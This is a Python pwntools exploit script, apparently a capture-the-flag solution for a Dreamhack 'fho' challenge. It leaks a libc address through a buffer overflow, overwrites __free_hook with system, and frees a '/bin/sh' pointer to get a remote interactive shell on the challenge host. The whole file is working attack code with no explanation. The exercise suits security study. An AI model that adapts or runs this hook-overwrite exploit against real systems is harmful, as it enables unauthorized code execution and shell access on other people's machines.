#!/usr/bin/env python3
from pwn import *

PORT =  18595
HOST = "host3.dreamhack.games"
exe = context.binary = ELF('./fho_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b*main+153
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

GDB()

p.sendafter(b"Buf: ", b"A"*0x48)
p.recvuntil(b"A"*0x48)
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x21bf7
log.info("libc_leak: "+ hex(libc.address))

p.sendlineafter(b"To write: ", str(libc.sym.__free_hook).encode())
p.sendlineafter(b"With: ", str(libc.sym.system).encode())


p.sendlineafter(b"free: ", str(next(libc.search(b"/bin/sh"))).encode())

p.interactive()